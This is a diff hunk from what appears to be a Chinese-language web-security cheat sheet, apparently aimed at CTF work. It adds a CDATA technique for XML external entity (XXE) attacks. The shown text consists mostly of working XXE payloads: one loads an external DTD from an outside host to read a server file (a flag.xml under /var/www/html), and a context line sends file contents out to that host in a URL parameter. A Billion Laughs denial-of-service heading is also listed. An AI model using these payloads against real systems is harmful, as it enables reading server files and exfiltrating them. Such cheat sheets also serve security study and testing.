@@ -3088,6 +3088,28 @@ xxe.dtd:
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://kaibro.tw/?a=%file;'>">
 ```
 
+## CDATA
+
+把特殊字元塞進 CDATA 解決無法讀取問題
+
+```xml
+<!DOCTYPE data [
+ <!ENTITY % dtd SYSTEM "http://kaibro.tw/cdata.dtd">
+     %dtd;
+     %all;
+ ]>
+<root>&f;</root>
+```
+
+cdata.dtd:
+
+```xml
+<!ENTITY % file SYSTEM "file:///var/www/html/flag.xml">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY f '%start;%file;%end;'>">
+```
+
 ## DoS
 
 - Billion Laugh Attack
